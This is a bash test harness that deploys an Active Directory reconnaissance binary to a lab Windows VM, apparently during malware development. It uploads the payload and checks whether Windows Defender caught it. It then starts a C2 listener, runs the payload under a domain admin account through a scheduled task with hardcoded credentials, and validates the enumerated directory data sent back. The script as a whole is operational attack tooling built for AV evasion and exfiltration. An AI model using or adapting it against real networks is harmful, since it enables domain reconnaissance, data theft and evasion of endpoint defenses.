#!/bin/bash
# Deploy and test AD recon binary against Samba AD
# Usage: ./scripts/deploy_ad_recon.sh [binary_path] [--recipe name]

BINARY="${1:-/tmp/ad_recon_dconly.exe}"
VM_PORT=10022
VM_USER=vmuser
VM_PASS=vmuser123
C2_PORT=9001
DOMAIN_USER="MALWARE\\it.admin"
DOMAIN_PASS="Adm1nP@ss!"
CAPTURE="/tmp/ad_recon_capture.bin"
SSH="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"

echo "=== AD Recon Deploy & Test ==="
echo "Binary: $BINARY ($(stat -c%s "$BINARY" 2>/dev/null || echo 0) bytes)"
echo ""

# 1. Check VM
echo "[1/6] Checking VM..."
ALIVE=$(eval $SSH "'echo ALIVE'" 2>/dev/null | tr -d '\r')
if [ "$ALIVE" != "ALIVE" ]; then echo "FAIL: VM not reachable"; exit 1; fi
echo "  VM alive"

# 2. Upload
echo "[2/6] Uploading..."
eval $SCP "$BINARY" "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\payload.exe'" 2>/dev/null
sleep 3
EXISTS=$(eval $SSH "'if exist C:\\Users\\$VM_USER\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'" 2>/dev/null | tr -d '\r')
if [ "$EXISTS" = "GONE" ]; then
    echo "  FAIL: Defender quarantined the binary"
    eval $SSH "'powershell -Command \"Get-MpThreatDetection | Select-Object -Last 1 | Format-List\"'" 2>/dev/null | tr -d '\r' | sed 's/^/  /'
    exit 2
fi
echo "  Binary survived Defender"

# 3. Start C2 listener
echo "[3/6] Starting C2 listener on :$C2_PORT..."
fuser -k $C2_PORT/tcp 2>/dev/null
sleep 1
python3 -u -c "
import socket
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', $C2_PORT)); srv.listen(1); srv.settimeout(120)
try:
    conn, addr = srv.accept()
    data = b''; conn.settimeout(30)
    while True:
        try:
            chunk = conn.recv(65536)
            if not chunk: break
            data += chunk
        except socket.timeout: break
    conn.close()
    with open('$CAPTURE', 'wb') as f: f.write(data)
except socket.timeout:
    open('$CAPTURE', 'wb').close()
srv.close()
" &
C2_PID=$!
sleep 2

# 4. Execute as domain user
echo "[4/6] Executing as domain user..."
eval $SSH "'schtasks /create /tn ad_recon_test /tr \"C:\\Users\\$VM_USER\\Desktop\\payload.exe\" /sc once /st 00:00 /f /ru $DOMAIN_USER /rp $DOMAIN_PASS'" 2>/dev/null | tr -d '\r'
eval $SSH "'schtasks /run /tn ad_recon_test'" 2>/dev/null | tr -d '\r'

# 5. Wait for data
echo "[5/6] Waiting for data..."
wait $C2_PID
SIZE=$(stat -c%s "$CAPTURE" 2>/dev/null || echo 0)
echo "  Received: $SIZE bytes"

# 6. Validate
echo "[6/6] Validating..."
if [ "$SIZE" -lt 100 ]; then
    echo "  FAIL: No data received"
    RESULT="FAIL"
else
    python3 -c "
import re, json, sys
data = open('$CAPTURE', 'rb').read().decode('utf-8', errors='ignore')
markers = list(re.finditer(r'===FILE:(\w+\.json):(\d+)===', data))
total_entities = 0
valid_files = 0
for m in markers:
    name = m.group(1)
    size = int(m.group(2))
    jd = data[m.end():m.end()+size]
    try:
        parsed = json.loads(jd)
        count = parsed.get('meta', {}).get('count', 0)
        total_entities += count
        valid_files += 1
        print(f'  {name}: {count} entities')
    except json.JSONDecodeError as e:
        print(f'  {name}: INVALID JSON - {e}')
        sys.exit(1)

# Check minimums
if valid_files < 3:
    print(f'  FAIL: Only {valid_files} valid JSON files (expected 3+)')
    sys.exit(1)
if total_entities < 10:
    print(f'  FAIL: Only {total_entities} total entities (expected 10+)')
    sys.exit(1)
print(f'  Total: {total_entities} entities in {valid_files} files')
print(f'  PASS')
" 2>&1
    RESULT=$?
fi

# Defender check
echo ""
echo "--- Defender Status ---"
eval $SSH "'powershell -Command \"Get-MpThreatDetection | Where-Object { \\\$_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) } | Select-Object ThreatID,ProcessName | Format-List\"'" 2>/dev/null | tr -d '\r'

# Cleanup
echo "--- Cleanup ---"
eval $SSH "'schtasks /delete /tn ad_recon_test /f 2>NUL'" 2>/dev/null | tr -d '\r'
eval $SSH "'taskkill /f /im payload.exe 2>NUL'" 2>/dev/null | tr -d '\r'
eval $SSH "'del \"C:\\Users\\$VM_USER\\Desktop\\payload.exe\" 2>NUL'" 2>/dev/null | tr -d '\r'
echo "  Cleaned"
